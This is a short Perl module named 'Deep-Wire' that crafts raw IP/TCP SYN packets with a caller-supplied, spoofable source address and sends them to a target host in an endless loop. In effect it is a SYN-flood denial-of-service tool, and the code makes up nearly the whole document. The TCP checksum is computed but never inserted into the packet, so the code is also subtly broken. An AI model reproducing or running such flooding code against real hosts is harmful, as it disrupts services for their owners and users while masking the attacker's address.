package My::WireNet;
use strict;
use warnings;
use Socket;
use Win32::Console;
use Win32::Console::ANSI;

use Exporter qw(import);

our @EXPORT_OK = qw(wirestart contcp);

my $CONSOLE=Win32::Console->new;
$CONSOLE->Title('Deep-Wire - Version 0.2');

#Fonctions exportable
sub wirestart{
	my ($x, $y) = @_;
	return $x +$y;
}


sub contcp{
	my ($src_host, $src_port, $dst_host, $dst_port) = @_;
	if(!defined $src_host or !defined $src_port or !defined $dst_host or !defined $dst_port){
		print "Usage: $0 <source host> <source port> <dest host> <dest port> \n";
		exit;
	}

	else{
		Init($src_host, $src_port, $dst_host, $dst_port);
	}

}

#Fonctions internes
sub Init{
	my ($src_host, $src_port, $dst_host, $dst_port) = @_;
	$src_host = (gethostbyname($src_host));
	$dst_host = (gethostbyname($dst_host));

    #Paramétrage de l'envoi des paquets
    my $IPROTO_RAW = 255;
    socket(RAW, AF_INET, SOCK_RAW, $IPROTO_RAW) or die $!;
    setsockopt(RAW, 0, 1, 1)
    or die $!;

    my ($packet) = makeheaders($src_host, $src_port, $dst_host, $dst_port);
    my ($destination) = pack('Sna4x8', AF_INET, $dst_port, $dst_host);
    my $compteur;
    #Envoie des requêtes
    while(1){
    	send(RAW, $packet, 0, $destination)
    	or die $!;
    	
	}

}

sub makeheaders{
	my $IPPROTO_TCP = 6;
	my ($src_host, $src_port, $dst_host, $dst_port) = @_;
	my $zero_cksum = 0;

	#Construction du paquet
	my $tcp_len = 20;
	my $seq = 13456;
	my $seq_ack = 0;

	my $tcp_doff = "5";
	my $tcp_res = 0;
	my $tcp_doff_res = $tcp_doff . $tcp_res;

	my $tcp_urg = 0;
	my $tcp_ack = 0;
	my $tcp_psh = 0;
	my $tcp_rst = 0;
	my $tcp_syn = 1;
	my $tcp_fin = 0;
	my $null = 0;

	my $tcp_win = 124;

	my $tcp_urg_ptr = 44;
	my $tcp_flags = $null . $null . $tcp_urg . $tcp_ack . $tcp_psh . $tcp_rst . $tcp_syn . $tcp_fin;

	my $tcp_check = 0;

	#Création de l'en-tête tcp
	my $tcp_header = pack('nnNNH2B8nvn', $src_port, $dst_port, $seq, $seq_ack, 
		$tcp_doff_res, $tcp_flags, $tcp_win, $tcp_check, $tcp_urg_ptr);

	my $tcp_pseudo =  pack('a4a4CCn' , $src_host, $dst_host, 0,
	 $IPPROTO_TCP, length($tcp_header) ) . $tcp_header;

	$tcp_check = &checksum($tcp_pseudo);
	#Contruction du paquet tcpip
	my $ip_ver = 4;
	my $ip_len = 5;
	my $ip_ver_len = $ip_ver . $ip_len;

	my $ip_tos = 00;
	my $ip_tot_len = $tcp_len + 20;
	my $ip_frag_id = 19245;
	my $ip_ttl = 25;
	my $ip_proto = $IPPROTO_TCP;
	my $ip_frag_flag = "010";
	my $ip_frag_oset = "0000000000000";
	my $ip_fl_fr = $ip_frag_flag . $ip_frag_oset;

	my $ip_header = pack('H2CnnB16CCna4a4', $ip_ver_len, $ip_tos, $ip_tot_len, $ip_frag_id, $ip_fl_fr , $ip_ttl , $ip_proto , $zero_cksum , $src_host , $dst_host);

	my $pkt = $ip_header . $tcp_header;

	return $pkt;
}

sub checksum{
	my ($msg) = @_;
	my ($len_msg, $num_short, $short, $chk);
	$len_msg = length($msg);
	$num_short = $len_msg / 2;
	$chk = 0;

	foreach $short(unpack("S$num_short", $msg))
	{
		$chk += $short;
	}

	$chk += unpack("C", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
	$chk = ($chk >> 16) + ($chk & 0xffff);

	return(~(($chk >> 16) + $chk) & 0xffff);

}
